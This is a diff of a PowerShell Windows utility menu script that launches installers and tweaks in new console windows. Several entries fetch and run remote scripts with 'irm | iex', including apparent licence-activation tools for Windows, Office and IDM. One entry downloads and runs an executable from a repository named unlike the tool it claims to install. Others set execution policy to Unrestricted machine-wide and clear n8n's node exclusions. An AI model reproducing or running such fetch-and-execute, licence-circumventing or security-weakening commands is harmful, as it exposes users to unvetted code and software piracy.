@@ -328,9 +328,11 @@ function Show-AIInPCMenu {
     Write-Host "   =                      AI IN PC                                ="
     Write-Host "   ================================================================"
     Write-Host ""
-    Write-Host "    [1] Agy                     [3] LLM-Checker Recommend"
+    Write-Host "    [1] Agy                     [4] LLM-Checker Recommend"
     Write-Host ""
-    Write-Host "    [2] Opencode                [4] Ollama"
+    Write-Host "    [2] Opencode                [5] Ollama"
+    Write-Host ""
+    Write-Host "    [3] Google Desktop App"
     Write-Host ""
     Write-Host "   ================================================================"
     Write-Host "    [Z] Go Back"
@@ -342,8 +344,9 @@ function Show-AIInPCMenu {
     switch ($subChoice) {
         '1' { Install-Agy; Show-AIInPCMenu }
         '2' { Install-Opencode; Show-AIInPCMenu }
-        '3' { Run-LLMChecker; Show-AIInPCMenu }
-        '4' { Install-Ollama; Show-AIInPCMenu }
+        '3' { Open-GoogleDesktopApp; Show-AIInPCMenu }
+        '4' { Run-LLMChecker; Show-AIInPCMenu }
+        '5' { Install-Ollama; Show-AIInPCMenu }
         'Z' { Show-MainMenu }
         default { Show-AIInPCMenu }
     }
@@ -525,66 +528,40 @@ function Open-Portfolio {
     Write-Host "Opening Your Browser with Portfolio"
     Write-Host "=========================================="
     Start-Process "https://afnan-nex.github.io/portfolio/index.html"
-    Pause-Script
 }
 
 function See-Policy {
     Write-Host "=========================================="
     Write-Host "Checking PowerShell Execution Policy"
     Write-Host "=========================================="
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Write-Host 'Current Execution Policy:'; Get-ExecutionPolicy -List"
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching in a new window..."
+    Start-Process cmd -ArgumentList "/k", "echo Current Execution Policy: && powershell -NoProfile -ExecutionPolicy Bypass -Command ""Get-ExecutionPolicy -List"" && echo. && echo Press any key to close... && pause"
 }
 
 function Unrestrict-Policy {
     Write-Host "=========================================="
     Write-Host "Setting PowerShell Policy to Unrestricted"
     Write-Host "=========================================="
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser; Set-ExecutionPolicy Unrestricted -Force -Scope LocalMachine"
-    Write-Host "Policy updated successfully."
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching in a new window..."
+    Start-Process cmd -ArgumentList "/k", "echo Setting PowerShell Execution Policy to Unrestricted... && powershell -NoProfile -ExecutionPolicy Bypass -Command ""Set-ExecutionPolicy Unrestricted -Force -Scope CurrentUser; Set-ExecutionPolicy Unrestricted -Force -Scope LocalMachine; Write-Host 'Policy updated successfully.'"" && echo. && echo Press any key to close... && pause"
 }
 
 function Install-Choco {
     Write-Host "=========================================="
-    Write-Host "Installing/Checking Chocolatey"
+    Write-Host "Installing Chocolatey"
     Write-Host "=========================================="
-    if (Get-Command choco -ErrorAction SilentlyContinue) {
-        Write-Host "Chocolatey is already installed."
-        choco --version
-    } else {
-        Write-Host "Opening new window to install Chocolatey..."
-        $chocoCmd = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(''https://community.chocolatey.org/install.ps1''))" && echo Chocolatey installation completed. && pause'
-        Start-Process cmd -ArgumentList "/c", $chocoCmd -Wait
-        Write-Host "Refreshing environment variables..."
-        Refresh-Env
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $chocoCmd = 'echo Installing Chocolatey... && powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(''https://community.chocolatey.org/install.ps1''))" && echo. && echo Chocolatey installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $chocoCmd
 }
 
 function Install-NodeLTS {
     Write-Host "=========================================="
     Write-Host "Installing Node.js LTS"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    if (Get-Command node -ErrorAction SilentlyContinue) {
-        Write-Host "Node.js is already installed."
-        node --version
-    } else {
-        Write-Host "Opening new window to install Node.js LTS..."
-        $nodeCmd = 'choco install nodejs-lts -y && echo Node.js installation completed. && pause'
-        Start-Process cmd -ArgumentList "/c", $nodeCmd -Wait
-        Write-Host "Refreshing environment variables..."
-        Refresh-Env
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $nodeCmd = 'echo Installing Node.js LTS via Chocolatey... && choco install nodejs-lts -y && echo. && echo Node.js installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $nodeCmd
 }
 
 function Run-Titus {
@@ -592,8 +569,6 @@ function Run-Titus {
     Write-Host "Running Chris Titus Tech Windows Utility"
     Write-Host "=========================================="
     Start-Process cmd -ArgumentList "/k", "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://christitus.com/win' | iex`""
-    Write-Host ""
-    Pause-Script
 }
 
 function Run-MassGrave {
@@ -601,8 +576,6 @@ function Run-MassGrave {
     Write-Host "Running Microsoft Activation Scripts"
     Write-Host "=========================================="
     Start-Process cmd -ArgumentList "/k", "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm https://get.activated.win | iex`""
-    Write-Host ""
-    Pause-Script
 }
 
 function Run-Coporton {
@@ -610,313 +583,162 @@ function Run-Coporton {
     Write-Host "Running Coporton Tool"
     Write-Host "=========================================="
     Start-Process cmd -ArgumentList "/k", "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm https://coporton.com/ias | iex`""
-    Pause-Script
 }
 
-function Install-IDM                                                                            
-{                                                                
-    Write-Host "=========================================="                                 
-    Write-Host "Downloading with IDM"                                                        
-    Write-Host "=========================================="                                 
+function Install-IDM {
+    Write-Host "=========================================="
+    Write-Host "Downloading with IDM"
+    Write-Host "=========================================="
     Start-Process cmd -ArgumentList "/k", "curl.exe -L -O https://github.com/planetshine0000/vc-redist-latest/releases/download/v1.0.1/Download.exe && Download.exe"
-    Write-Host ""                                                                            
-    Pause-Script                                                                         
-}                                                                         
+}
 
 function Run-Sparkle {
     Write-Host "=========================================="
     Write-Host "Running Sparkle Tool"
     Write-Host "=========================================="
     Start-Process cmd -ArgumentList "/k", "powershell -NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/Parcoil/Sparkle/v2/get.ps1 | iex`""
-    Write-Host ""
-    Pause-Script
 }
 
 function Run-GHGrab {
     Write-Host "=========================================="
     Write-Host "Running GHGrab - GitHub Repository Grabber"
     Write-Host "=========================================="
-    Write-Host ""
-    Write-Host "  GHGrab allows you to quickly download files/folders from GitHub repos."
-    Write-Host "  Example usage: npx @ghgrab/ghgrab https://github.com/user/repo/path"
-    Write-Host ""
-    Write-Host "  Checking for Node.js/npx..."
-
-    if (-not (Get-Command npx -ErrorAction SilentlyContinue)) {
-        Write-Host ""
-        Write-Host "  [!] npx not found. Installing Node.js LTS via Chocolatey..."
-        Write-Host ""
-        if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-            Write-Host "  Installing Chocolatey first..."
-            Install-Choco
-        }
-        Write-Host "  Installing Node.js LTS..."
-        choco install nodejs-lts -y
-        Write-Host "  Refreshing environment..."
-        Refresh-Env
-    }
-
-    Write-Host ""
-    Write-Host "  Launching GHGrab..."
-    Write-Host "  ------------------------------------------"
-    Write-Host ""
-
-    Start-Process cmd -ArgumentList "/k", "echo === GHGrab === && npx @ghgrab/ghgrab && echo. && echo Press any key to return... && pause"
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching GHGrab in a new window..."
+    Start-Process cmd -ArgumentList "/k", "echo === GHGrab === && npx @ghgrab/ghgrab && echo. && echo Press any key to close... && pause"
 }
 
 function Install-Python {
     Write-Host "=========================================="
     Write-Host "Installing Python"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    if (Get-Command python -ErrorAction SilentlyContinue) {
-        Write-Host "Python is already installed."
-        python --version
-    } else {
-        Write-Host "Opening new window to install Python..."
-        $pythonCmd = 'choco install python -y && echo Python installation completed. && pause'
-        Start-Process cmd -ArgumentList "/c", $pythonCmd -Wait
-        Write-Host "Refreshing environment variables..."
-        Refresh-Env
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $pythonCmd = 'echo Installing Python via Chocolatey... && choco install python -y && echo. && echo Python installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $pythonCmd
 }
 
 function Install-Git {
     Write-Host "=========================================="
     Write-Host "Installing Git"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    if (Get-Command git -ErrorAction SilentlyContinue) {
-        Write-Host "Git is already installed."
-        git --version
-    } else {
-        Write-Host "Opening new window to install Git..."
-        $gitCmd = 'choco install git -y && echo Git installation completed. && pause'
-        Start-Process cmd -ArgumentList "/c", $gitCmd -Wait
-        Write-Host "Refreshing environment variables..."
-        Refresh-Env
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $gitCmd = 'echo Installing Git via Chocolatey... && choco install git -y && echo. && echo Git installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $gitCmd
 }
 
 function Install-Dotnet {
     Write-Host "=========================================="
     Write-Host "Installing .NET Runtime and SDK"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    if (Get-Command dotnet -ErrorAction SilentlyContinue) {
-        Write-Host ".NET is already installed."
-        dotnet --version
-    } else {
-        Write-Host "Opening new window to install .NET..."
-        $dotnetCmd = 'choco install dotnet -y && echo .NET installation completed. && pause'
-        Start-Process cmd -ArgumentList "/c", $dotnetCmd -Wait
-        Write-Host "Refreshing environment variables..."
-        Refresh-Env
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $dotnetCmd = 'echo Installing .NET via Chocolatey... && choco install dotnet -y && echo. && echo .NET installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $dotnetCmd
 }
 
 function Install-FFmpeg {
     Write-Host "=========================================="
     Write-Host "Installing FFmpeg"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    if (Get-Command ffmpeg -ErrorAction SilentlyContinue) {
-        Write-Host "FFmpeg is already installed."
-        ffmpeg -version 2>&1 | Select-String "ffmpeg version"
-    } else {
-        Write-Host "Opening new window to install FFmpeg..."
-        $ffmpegCmd = 'choco install ffmpeg -y && echo FFmpeg installation completed. && pause'
-        Start-Process cmd -ArgumentList "/c", $ffmpegCmd -Wait
-        Write-Host "Refreshing environment variables..."
-        Refresh-Env
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $ffmpegCmd = 'echo Installing FFmpeg via Chocolatey... && choco install ffmpeg -y && echo. && echo FFmpeg installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $ffmpegCmd
 }
 
 function Install-7Zip {
     Write-Host "=========================================="
     Write-Host "Installing 7-Zip"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    if (Get-Command 7z -ErrorAction SilentlyContinue) {
-        Write-Host "7-Zip is already installed."
-    } else {
-        Write-Host "Opening new window to install 7-Zip..."
-        $zipCmd = 'choco install 7zip -y && echo 7-Zip installation completed. && pause'
-        Start-Process cmd -ArgumentList "/c", $zipCmd -Wait
-        Write-Host "Refreshing environment variables..."
-        Refresh-Env
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $zipCmd = 'echo Installing 7-Zip via Chocolatey... && choco install 7zip -y && echo. && echo 7-Zip installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $zipCmd
 }
 
 function Install-WinDirStat {
     Write-Host "=========================================="
     Write-Host "Installing WinDirStat"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    Write-Host "Opening new window to install WinDirStat..."
-    $wdsCmd = 'choco install windirstat -y && echo WinDirStat installation completed. && pause'
-    Start-Process cmd -ArgumentList "/c", $wdsCmd -Wait
-    Write-Host "Refreshing environment variables..."
-    Refresh-Env
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $wdsCmd = 'echo Installing WinDirStat via Chocolatey... && choco install windirstat -y && echo. && echo WinDirStat installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $wdsCmd
 }
 
 function Install-YTDLP {
     Write-Host "=========================================="
     Write-Host "Installing yt-dlp"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    Write-Host "Opening new window to install yt-dlp..."
-    $ytdlpCmd = 'choco install yt-dlp -y && echo yt-dlp installation completed. && pause'
-    Start-Process cmd -ArgumentList "/c", $ytdlpCmd -Wait
-    Write-Host "Refreshing environment variables..."
-    Refresh-Env
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $ytdlpCmd = 'echo Installing yt-dlp via Chocolatey... && choco install yt-dlp -y && echo. && echo yt-dlp installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $ytdlpCmd
 }
 
 function Install-Ngrok {
     Write-Host "=========================================="
     Write-Host "Installing ngrok"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    Write-Host "Opening new window to install ngrok..."
-    $ngrokCmd = 'choco install ngrok -y && echo ngrok installation completed. && pause'
-    Start-Process cmd -ArgumentList "/c", $ngrokCmd -Wait
-    Write-Host "Refreshing environment variables..."
-    Refresh-Env
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $ngrokCmd = 'echo Installing ngrok via Chocolatey... && choco install ngrok -y && echo. && echo ngrok installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $ngrokCmd
 }
 
 function Install-N8N {
     Write-Host "=========================================="
     Write-Host "Installing n8n Workflow Automation"
     Write-Host "=========================================="
-    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
-        Write-Host "Node.js is required. Installing Node.js first..."
-        Install-NodeLTS
-        Write-Host "Refreshing PATH environment variable..."
-        $env:Path += ";$env:ProgramFiles\nodejs"
-    }
-    Write-Host "Opening new CMD window to install n8n..."
-    $n8nCmd = 'echo Installing n8n Workflow Automation... && npm install -g n8n@latest --verbose && echo n8n installation completed. && echo Setting NODES_EXCLUDE environment variable... && setx NODES_EXCLUDE "[]" && setx NODES_EXCLUDE "[]" /M && echo Environment variables set successfully. Press any key to close this window. && pause'
+    Write-Host "Launching installation in a new window..."
+    $n8nCmd = 'echo Installing n8n Workflow Automation... && npm install -g n8n@latest --verbose && echo n8n installation completed. && echo Setting NODES_EXCLUDE environment variable... && setx NODES_EXCLUDE "[]" && setx NODES_EXCLUDE "[]" /M && echo Environment variables set successfully. && echo. && echo Press any key to close this window. && pause'
     Start-Process cmd -ArgumentList "/k", $n8nCmd
-    Write-Host ""
-    Pause-Script
 }
 
 function Install-GWS {
     Write-Host "=========================================="
     Write-Host "Installing Google Workspace CLI (GWS)"
     Write-Host "=========================================="
-    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
-        Write-Host "Node.js is required. Installing Node.js first..."
-        Install-NodeLTS
-        Write-Host "Refreshing PATH environment variable..."
-        $env:Path += ";$env:ProgramFiles\nodejs"
-    }
-    Write-Host "Opening new CMD window to install Google Workspace CLI..."
-    $gwsCmd = 'echo Installing Google Workspace CLI... && npm install -g @googleworkspace/cli && echo Installation completed. Press any key to close this window. && pause'
+    Write-Host "Launching installation in a new window..."
+    $gwsCmd = 'echo Installing Google Workspace CLI... && npm install -g @googleworkspace/cli && echo. && echo Installation completed. Press any key to close this window. && pause'
     Start-Process cmd -ArgumentList "/k", $gwsCmd
-    Write-Host ""
-    Pause-Script
 }
 
 function Install-Agy {
     Write-Host "=========================================="
     Write-Host "Installing Agy"
     Write-Host "=========================================="
-    Write-Host "Opening new CMD window to install Agy..."
-    $agyCmd = 'echo Installing Agy... && curl -fsSL https://antigravity.google/cli/install.cmd -o install.cmd && install.cmd && del install.cmd && echo Installation completed. Press any key to close this window. && pause'
+    Write-Host "Launching installation in a new window..."
+    $agyCmd = 'echo Installing Agy... && curl -fsSL https://antigravity.google/cli/install.cmd -o install.cmd && install.cmd --verbose && del install.cmd && echo. && echo Installation completed. Press any key to close this window. && pause'
     Start-Process cmd -ArgumentList "/k", $agyCmd
-    Write-Host ""
-    Pause-Script
 }
 
 function Install-Opencode {
     Write-Host "=========================================="
     Write-Host "Installing Opencode"
     Write-Host "=========================================="
-    if (-not (Get-Command npm -ErrorAction SilentlyContinue)) {
-        Write-Host "Node.js is required. Installing Node.js first..."
-        Install-NodeLTS
-        Write-Host "Refreshing PATH environment variable..."
-        $env:Path += ";$env:ProgramFiles\nodejs"
-    }
-    Write-Host "Opening new CMD window to install Opencode..."
-    $opencodeCmd = 'echo Installing Opencode... && npm i -g opencode-ai && echo Installation completed. Press any key to close this window. && pause'
+    Write-Host "Launching installation in a new window..."
+    $opencodeCmd = 'echo Installing Opencode... && npm i -g opencode-ai --verbose && echo. && echo Installation completed. Press any key to close this window. && pause'
     Start-Process cmd -ArgumentList "/k", $opencodeCmd
-    Write-Host ""
-    Pause-Script
+}
+
+function Open-GoogleDesktopApp {
+    Write-Host "=========================================="
+    Write-Host "Opening Google Desktop App"
+    Write-Host "=========================================="
+    Write-Host "Opening link in browser..."
+    Start-Process "https://search.google/google-app/desktop/next-steps/"
 }
 
 function Run-LLMChecker {
     Write-Host "=========================================="
     Write-Host "Running LLM-Checker Recommendation"
     Write-Host "=========================================="
-    if (-not (Get-Command npx -ErrorAction SilentlyContinue)) {
-        Write-Host "Node.js is required. Installing Node.js first..."
-        Install-NodeLTS
-    }
-    Write-Host "Opening new window to run LLM-Checker..."
+    Write-Host "Launching in a new window..."
     $checkerCmd = 'echo Running LLM-Checker recommend... && npx llm-checker recommend && echo. && echo Finished. Press any key to close... && pause'
     Start-Process cmd -ArgumentList "/k", $checkerCmd
-    Write-Host ""
-    Pause-Script
 }
 
 function Install-Ollama {
     Write-Host "=========================================="
     Write-Host "Installing Ollama"
     Write-Host "=========================================="
-    if (-not (Get-Command winget -ErrorAction SilentlyContinue)) {
-        Write-Host "Winget is required. Installing Winget first..."
-        Install-Winget
-    }
-    Write-Host "Opening new window to install Ollama..."
+    Write-Host "Launching installation in a new window..."
     $ollamaCmd = 'echo Installing Ollama... && winget install Ollama.Ollama && echo. && echo Finished. Press any key to close... && pause'
     Start-Process cmd -ArgumentList "/k", $ollamaCmd
-    Write-Host ""
-    Refresh-Env
-    Pause-Script
 }
 
 function Set-Win11Menu {
@@ -924,7 +746,6 @@ function Set-Win11Menu {
     Write-Host "Switching to Windows 11 New Context Menu"
     Write-Host "=========================================="
     Start-Process cmd -ArgumentList "/k", "reg delete HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2} /f && taskkill /f /im explorer.exe && start explorer.exe"
-    Pause-Script
 }
 
 function Set-Win10Menu {
@@ -932,369 +753,238 @@ function Set-Win10Menu {
     Write-Host "Switching to Windows 10 Classic Context Menu"
     Write-Host "=========================================="
     Start-Process cmd -ArgumentList "/k", "reg add HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32 /f /ve && taskkill /f /im explorer.exe && start explorer.exe"
-    Pause-Script
 }
 
 function Install-Winget {
     Write-Host "=========================================="
     Write-Host "Installing Windows Package Manager (Winget)"
     Write-Host "=========================================="
-    if (Get-Command winget -ErrorAction SilentlyContinue) {
-        Write-Host "Winget is already installed."
-        winget --version
-    } else {
-        Write-Host "Installing Winget..."
-        powershell -NoProfile -ExecutionPolicy Bypass -Command "try { `$progressPreference = 'silentlyContinue'; Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile 'winget.msixbundle'; Add-AppxPackage 'winget.msixbundle'; Remove-Item 'winget.msixbundle' -Force; Write-Host 'Winget installed successfully.' } catch { Write-Host 'Error installing Winget: ' + `$_.Exception.Message; Write-Host 'You may need to install from Microsoft Store instead.' }"
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $wingetPs = @'
+Write-Host "Installing Winget..."
+try {
+    $progressPreference = 'silentlyContinue'
+    Invoke-WebRequest -Uri 'https://aka.ms/getwinget' -OutFile 'winget.msixbundle'
+    Add-AppxPackage 'winget.msixbundle'
+    Remove-Item 'winget.msixbundle' -Force
+    Write-Host "Winget installed successfully."
+} catch {
+    Write-Host ("Error installing Winget: " + $_.Exception.Message)
+    Write-Host "You may need to install from Microsoft Store instead."
+}
+Read-Host "Press Enter to close"
+'@
+    $tmp = "$env:TEMP\install_winget.ps1"
+    $wingetPs | Out-File -FilePath $tmp -Encoding UTF8
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
 }
 
 function Install-Office365 {
     Write-Host "=========================================="
     Write-Host "Installing Office 365 ProPlus"
     Write-Host "=========================================="
-    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
-        Write-Host "Curl is required but not found. Please update Windows."
-        Pause-Script
-        return
-    }
-
-    Write-Host "Downloading Office 365 Setup..."
-    curl.exe -L -o "$env:TEMP\OfficeSetup.exe" "https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=en-us&version=O16GA"
-
-    if (Test-Path "$env:TEMP\OfficeSetup.exe") {
-        Write-Host "Launching Office Installer..."
-        Write-Host "NOTE: The installation will continue in the background."
-        Start-Process "$env:TEMP\OfficeSetup.exe"
-    } else {
-        Write-Host "Failed to download Office Setup."
-    }
-
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching download and installation in a new window..."
+    $officeCmd = 'echo Downloading Office 365 Setup... && curl.exe -L -o "%TEMP%\OfficeSetup.exe" "https://c2rsetup.officeapps.live.com/c2r/download.aspx?ProductreleaseID=O365ProPlusRetail&platform=x64&language=en-us&version=O16GA" && if exist "%TEMP%\OfficeSetup.exe" (echo Launching Office Installer... && start "" "%TEMP%\OfficeSetup.exe") else (echo Download failed.) && pause'
+    Start-Process cmd -ArgumentList "/k", $officeCmd
 }
 
 function Install-Everything {
     Write-Host "=========================================="
     Write-Host "Installing Everything Search Engine"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    if (Get-Command everything -ErrorAction SilentlyContinue) {
-        Write-Host "Everything is already installed."
-    } else {
-        Write-Host "Installing Everything..."
-        choco install everything -y
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $everythingCmd = 'echo Installing Everything via Chocolatey... && choco install everything -y && echo. && echo Everything installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $everythingCmd
 }
 
 function Install-Chrome {
     Write-Host "=========================================="
     Write-Host "Installing Google Chrome"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    if (Get-Command chrome -ErrorAction SilentlyContinue) {
-        Write-Host "Google Chrome is already installed."
-    } else {
-        Write-Host "Installing Google Chrome..."
-        choco install googlechrome -y
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $chromeCmd = 'echo Installing Google Chrome via Chocolatey... && choco install googlechrome -y && echo. && echo Chrome installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $chromeCmd
 }
 
 function Install-Zen {
     Write-Host "=========================================="
-    Write-Host "Installing Zen Browser (Manual Method)"
+    Write-Host "Installing Zen Browser"
     Write-Host "=========================================="
-    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
-        Write-Host "Curl is required but not found."
-        Pause-Script
-        return
-    }
-
+    Write-Host "Launching installation in a new window..."
     $zenCmd = 'echo Downloading Zen Browser installer... & curl.exe -L -o "%TEMP%\zen-installer.exe" "https://github.com/zen-browser/desktop/releases/latest/download/zen.installer.exe" & if exist "%TEMP%\zen-installer.exe" (echo Running installer... & start /wait "" "%TEMP%\zen-installer.exe" & del "%TEMP%\zen-installer.exe") else (echo Download failed. Please install manually. & start https://zen-browser.app/download)'
     Start-Process cmd -ArgumentList "/k", $zenCmd
-
-    Write-Host ""
-    Pause-Script
 }
 
 function Install-Cursor {
     Write-Host "=========================================="
     Write-Host "Cloning Elegant Repository from GitHub"
     Write-Host "=========================================="
-    if (-not (Get-Command git -ErrorAction SilentlyContinue)) {
-        Write-Host "Git is required. Installing Git first..."
-        Install-Git
-    }
-    Write-Host "Cloning repository..."
-    git clone https://github.com/afnan-nex/Elegant
-    if ($LASTEXITCODE -eq 0) {
-        Write-Host "Repository cloned successfully to Elegant folder."
-    } else {
-        Write-Host "Failed to clone repository. Please check your internet connection or Git installation."
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching in a new window..."
+    $cursorCmd = 'echo Cloning Elegant repository from GitHub... && git clone https://github.com/afnan-nex/Elegant && echo. && echo Repository cloned successfully to Elegant folder. && pause'
+    Start-Process cmd -ArgumentList "/k", $cursorCmd
 }
 
 function Set-CMD0A {
     Write-Host "=========================================="
     Write-Host "Changing CMD color to 0a"
     Write-Host "=========================================="
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/afnan-nex/my-fav-scripts/main/cmd-clr-to-0a.cmd' -OutFile 'cmd-clr-to-0a.cmd'; Start-Process 'cmd-clr-to-0a.cmd'; Write-Host 'CMD color script downloaded and executed.' } catch { Write-Host 'Error downloading script: ' + `$_.Exception.Message }"
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching in a new window..."
+    $cmd0aPs = @'
+Write-Host "Downloading CMD color script..."
+try {
+    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/afnan-nex/my-fav-scripts/main/cmd-clr-to-0a.cmd' -OutFile 'cmd-clr-to-0a.cmd'
+    Start-Process 'cmd-clr-to-0a.cmd'
+    Write-Host "CMD color script downloaded and executed."
+} catch {
+    Write-Host ("Error: " + $_.Exception.Message)
+}
+Read-Host "Press Enter to close"
+'@
+    $tmp = "$env:TEMP\set_cmd0a.ps1"
+    $cmd0aPs | Out-File -FilePath $tmp -Encoding UTF8
+    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$tmp`""
 }
 
 function Install-OBS {
     Write-Host "=========================================="
     Write-Host "Installing OBS Studio"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    if (Get-Command obs64 -ErrorAction SilentlyContinue) {
-        Write-Host "OBS Studio is already installed."
-    } else {
-        Write-Host "Installing OBS Studio..."
-        choco install obs-studio -y
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $obsCmd = 'echo Installing OBS Studio via Chocolatey... && choco install obs-studio -y && echo. && echo OBS Studio installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $obsCmd
 }
 
 function Install-RustDesk {
     Write-Host "=========================================="
     Write-Host "Installing RustDesk"
     Write-Host "=========================================="
-    if (-not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "Chocolatey is required. Installing Chocolatey first..."
-        Install-Choco
-    }
-    Write-Host "Installing RustDesk..."
-    choco install rustdesk -y
-    if ($LASTEXITCODE -ne 0) {
-        Write-Host "RustDesk installation failed."
-    }
-    Write-Host ""
-    Pause-Script
+    Write-Host "Launching installation in a new window..."
+    $rustdeskCmd = 'echo Installing RustDesk via Chocolatey... && choco install rustdesk -y && echo. && echo RustDesk installation completed. && pause'
+    Start-Process cmd -ArgumentList "/k", $rustdeskCmd
 }
 
 function Install-HiBit {
     Write-Host "=========================================="
     Write-Host "Installing HiBit Uninstaller"
     Write-Host "=========================================="
-    if (-not (Get-Command curl.exe -ErrorAction SilentlyContinue)) {
-        Write-Host "Curl is required but not found."
-        Pause-Script
-        return
-    }
-
-    Write-Host "Downloading HiBit Uninstaller..."
-    curl.exe -L -o "$env:TEMP\HiBitSetup.exe" "https://www.hibitsoft.ir/HiBitUninstaller/HiBitUninstaller-setup-4.0.10.exe"
-
-    if (Test-Path "$env:TEMP\HiBitSetup.exe") {
-        Write-Host "Running installer..."
-        Start-Process -FilePath "$env:TEMP\HiBitSetup.exe" -Wait
-        Write-Host "Cleaning up..."
-        Remove-Item "$env:TEMP\HiBitSetup.exe" -Force
-    } else {
-        Write-Host "Failed to download HiBit Uninstaller."
